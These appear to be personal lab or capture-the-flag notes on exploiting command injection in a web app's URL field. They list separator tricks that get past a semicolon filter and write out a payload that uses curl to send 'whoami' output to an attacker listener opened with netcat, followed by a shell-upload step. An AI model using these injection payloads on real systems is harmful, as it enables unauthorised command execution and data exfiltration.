![[Pasted image 20250406155750.png]]
	- Trying: `localhost; whoami:` still works, but it should not as `localhostwww-data` is not a website
	![[Pasted image 20250406160755.png]]
	==- Maybe **`;` is `filtered`.** We can use `backtick` or `$(cmd)` or even `\n` for new command:==
		- `backticks`
		- `\n` => [[http://localhost\n curl http://172.19.0.1:9001/`whoami`]]
		- `$(cmd)` 
		- `&&`
		- `|`
		 ![[Pasted image 20250406160328.png]]

# Getting output by sending on address
---
```python
http://172.19.0.1:9001/`whoami` 
```
- This will try to reach our IP and try to get the output of `whoami` command i.e. `www-data`: [http://172.19.0.1:9001/www-data]
- `nc -lnvp 9001`
![[Pasted image 20250406161017.png]]
![[Pasted image 20250406161239.png]]


# Getting the shell
---
- Upload the shell and get the shell easily
- ![[Pasted image 20250406161911.png]]